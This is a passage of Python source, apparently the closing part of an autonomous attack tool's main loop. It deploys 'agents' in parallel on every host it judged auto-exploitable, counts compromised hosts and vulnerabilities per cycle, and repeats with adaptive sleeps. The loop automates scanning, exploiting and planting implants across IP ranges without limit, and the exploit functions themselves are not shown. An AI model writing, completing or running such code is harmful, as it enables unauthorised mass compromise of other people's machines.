        with ThreadPoolExecutor(max_workers=10) as ex:
            futures = {
                ex.submit(deploy_agent, v['host'], v['port'], v): v
                for v in auto_exploitable
            }
            for f in as_completed(futures):
                result = f.result()
                if result and result.get('success'):
                    cycle_deployed.append(result)
                    log(f"  ✅ DEPLOYED: {result['agent_id']}", "DEPLOY")

        # ── PHASE 6: REPORT ─────────────────────────────────────────
        cycle_time = time.time() - cycle_start
        cycle_data = {
            'cycle': CYCLE,
            'duration_s': round(cycle_time, 1),
            'target_range': str(target_range),
            'targets_generated': len(targets),
            'live_hosts': len(live_hosts),
            'hosts_with_open_ports': len(scan_results),
            'vulnerabilities_found': len(all_vulns),
            'auto_exploitable': len(auto_exploitable),
            'agents_deployed_this_cycle': len(cycle_deployed),
            'total_deployed_all_time': TOTAL_DEPLOYED,
            'total_vulns_all_time': TOTAL_VULNS,
            'scan_results': [
                {'ip': r['ip'], 'ports': r['open_ports']} for r in scan_results
            ],
            'vulnerabilities': all_vulns[:20],  # cap for file size
            'timestamp': datetime.now().isoformat()
        }
        save_cycle_report(cycle_data)

        log("=" * 62, "CYCLE")
        log(f"CYCLE #{CYCLE} DONE in {cycle_time:.1f}s", "CYCLE")
        log(f"  Targets: {len(targets)} IPs → {len(live_hosts)} live → {len(scan_results)} with open ports", "CYCLE")
        log(f"  Vulns:   {len(all_vulns)} found ({len(auto_exploitable)} exploitable)", "CYCLE")
        log(f"  Deploy:  {len(cycle_deployed)} agents this cycle", "CYCLE")
        log(f"  Totals:  {TOTAL_VULNS} vulns | {TOTAL_DEPLOYED} agents all-time", "CYCLE")
        log("=" * 62, "CYCLE")

        # Adaptive sleep — faster on early cycles
        sleep_time = 15 if CYCLE < 5 else (30 if CYCLE < 20 else 45)
        log(f"Next cycle in {sleep_time}s...", "LOOP")

        for _ in range(sleep_time):
            if not RUNNING:
                break
            time.sleep(1)

    log(f"Autonomous loop stopped after {CYCLE} cycles", "WARN")
    log(f"Total: {TOTAL_VULNS} vulns found, {TOTAL_DEPLOYED} agents deployed", "INFO")

if __name__ == '__main__':
    main()